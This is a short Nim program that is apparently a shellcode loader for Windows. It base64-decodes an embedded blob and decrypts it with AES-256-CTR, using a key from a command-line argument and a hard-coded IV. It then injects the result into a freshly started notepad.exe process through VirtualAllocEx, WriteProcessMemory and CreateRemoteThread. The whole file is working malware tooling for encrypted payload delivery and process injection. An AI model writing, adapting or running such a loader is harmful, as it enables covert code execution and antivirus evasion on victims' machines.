import winim/lean
import osproc
import os
import base64
import nimcrypto

proc CRT[byte](shellcode: openArray[byte]): void =
    let tProcess = startProcess("notepad.exe")
    let Hand = OpenProcess(PROCESS_ALL_ACCESS,false,cast[DWORD](tProcess.processID))
    let Point = VirtualAllocEx(Hand,NULL,cast[SIZE_T](shellcode.len),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
    WriteProcessMemory(Hand,Point,unsafeAddr shellcode,cast[SIZE_T](shellcode.len),NULL)
    # var Old: PDWORD
    # VirtualProtectEx(Hand,Point,cast[SIZE_T](shellcode.len),PAGE_EXECUTE_READ, Old)
    CreateRemoteThread(Hand,NULL,0,cast[LPTHREAD_START_ROUTINE](Point),NULL,0,NULL)


when isMainModule:

    func toByteSeq*(str: string): seq[byte] {.inline.} = @(str.toOpenArrayByte(0, str.high))
    let code: string = "V5v17saPI/CM6UeGi6gIYbO8R+Qf4c4fklz6bhOlW4WQX8vX3n705aJm0vQjjbhGQ4K4FigN71TK2J+fNBEP8nq1Fg/XUPmNHCUUhfNwbGAziYu5vts+7ekUaXB95kpXnLDD53IBGiOsGuFJOs7g9dVOf5bGW6BKSydOUq0lHi9XLH0HpqfA6s4mU6PSx+Zc8fcXp7Xg/M4zgmltuSH+1eGREMmDOgpUW28dNyDEfIiBWE7QMaTx+i3FBbHTKrW1ILoEIa/sHFfx7YvbSW+1bDgpAzta3W9vwt5KoUhc+cAnhlonnhn2/qsmR8FD1utt207kiyDV+WC0zG/J/yamunAxRHllqu9XkK+E5bhw9+ofZEBUv9bXrfYwyRpsCJWsQVtB9zZPJTPTzMsHyhpQI08Y8ifis1z1daGddh7F9XNadH7nniVnS794ObztrbUPwdxv9Tv0x599loBWdoqTIAzvxfb8j++E+SAI0oBn5DRMPqMUqcVdkzIrITaoUkbbgc3D+HfN/JOjWt31fI3zYUTCmYwDe9RSwLq3bLFaJXPrL8OrwRGieY2uhppXig0cWstM44yGgqP6AzxHyBOVzZ1h+H7aHIX3+o7bC1/prgIz2nMF4ZHciA+euuqd+hJGzcuW6bb7Z9hxj+A1Qwi9eZ2klI6sgRJuhYwW79B3"
    var
        encrypted: seq[byte] = toByteSeq(decode(code))
        dctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        decrypted: seq[byte] = newSeq[byte](len(encrypted))

    var expandedKey = sha256.digest(paramStr(1))
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

    # Change  IV
    dctx.init(key, [byte 123, 231, 234, 243, 123, 231, 234, 243, 125, 249, 123, 231, 234, 243, 133, 149])
    dctx.decrypt(encrypted, decrypted)
    dctx.clear()
    CRT(decrypted)